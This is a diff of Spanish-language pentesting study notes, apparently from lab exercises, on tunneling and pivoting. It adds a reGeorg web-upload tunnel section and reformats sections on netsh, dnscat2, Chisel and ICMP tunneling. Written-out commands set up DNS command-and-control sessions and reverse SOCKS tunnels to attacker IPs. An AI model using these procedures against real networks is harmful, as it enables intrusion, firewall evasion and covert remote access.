@@ -4,7 +4,7 @@ Tunelizacion se refiere a ofuscar nuestros comandos o peticiones para que parezc
 Lateral movement se refiere a poder ingresar a un host gracias a otro ya vulnerado. No se refiere a host internos dentro de la red, eso seria pivoting
 
 Para graficar: excalidraw
-
+----------      ----------      ----------      ----------
 	#### SSH
 #### LINUX
 
@@ -105,7 +105,6 @@ De todas formas PuTTY es muy usado actualmente por los administradores de sistem
 plink -D 9050 ubuntu@10.129.15.50
 #Iniciamos una sesion ssh con el host ubuntu y comienza a escuchar en el 9050.
 
-
 	### NETSH.EXE
 Es un programa en windows que nos permite crear rutas entre host asi como ver configuracion de firewall.
 
@@ -115,9 +114,20 @@ C:\Windows\system32> netsh.exe interface portproxy show v4tov4
 #Verificamos si nos rutea de uno a otro
 Una vez hechoe esto, si nos conectamos (con xfreerdp por ej) a la maquina 10.129.15.150:8080 nos manda hacia 172.16.5.25:3389
 
+	###Re-Georg
+maquina: hackback (s4vitar writeup)
+Permite generar un tunel. Estos estan escritos en diferentes lenguajes como aspx, php, etc.
+Se sube el tunnel.X al servidor.
 
+git clone https://github.com/sensepost/reGeorg.git
+python2 reGeorgeSocksProxy.py -u <path/to/fileuploaded> -p <puerto>
+#Ejecuto el comando aspecificando la url en la que esta subido el tunnel.X especificando un puerto para escucha
+socks4 127.0.0.1 1234
+#Configuracion en proxychains
+proxychains wvil-winrm -i 127.0.0.1 -u "usr" -p "pwd"
+#Usando proxychains podemos mandar los paquetes a donde escucha ReGerog y acceder a X cosa (en este caso un winrm local del target)
 
-
+----------      ----------      ----------      ----------
 	#### DNS
 	### Dnscat2
 dnscat2 es un tool para tunneling usando DNS. Hace que el target utilice un servidor DNS externo, de esta forma se saltean los firewalls
@@ -149,41 +159,31 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 dnscat2> window -i nro
 #Una vez ejecutado el otro comando, se crea una sesion. Reemplazar el nro por el nro de la sesion
 
-
-
+----------      ----------      ----------      ----------
 	#### HTTP
 	### Chisel
 Chisel es un tool para tunneling que usa http para transportar data mediante SSH
 
 git clone https://github.com/jpillora/chisel.git
 #Tool
-
 cd chisel
 go build
 #Instalar
-
 scp chisel ubuntu@10.129.202.64:~/
 #Enviamos el binario creado por ssh al host pivot
-
 ./chisel server -v -p 1234 --socks5
 #Se pone en escucha en el puerto 1234 (en este caso) para enviar las conexiones a todos los host a los que el pivote llegue
-
 ./chisel client -v 10.129.202.64:1234 socks
 #De esta forma nos conectammos al pivote:port
-
 socks5 127.0.0.1 1080
 #Agregando esto a proxychains.conf (y comentando la entradaa tor) nos permite podes usar proxychains con chisel
-
 En el caso de que reglas de firewall evite conexiones entrantes al pivote podemos usar laa opcion --reverse
-
 sudo ./chisel server --reverse -v -p 1234 --socks5
 #Con esta flag evitamos es regla
-
 ./chisel client -v 10.10.14.17:1234 R:socks
 #Configuramos el cliente con la R para setear el reverse
 
-
-
+----------      ----------      ----------      ----------
 	####ICMP
 	###ptunnel-ng
 Esta tunelizacion funciona encapsulando el trafico en paquetes ICMP. Esto solo funcionaria en una red donde el firewall permita pingear targets
@@ -206,6 +206,7 @@ ssh -p2222 -lubuntu 127.0.0.1
 #Confirmamos que podamos conectarnos mediante ptunnel-ng
 Una vez realizado esto podemos realizar dynamic port forwarding con SSH (-D 9050) para usarlo con proxychains
 
+----------      ----------      ----------      ----------
 	####RDP
 	###SocksOverRDP
 Usa Dynamic virtual channels (DVC). DVC tuneliza nuestros paquetes mediante RDP.
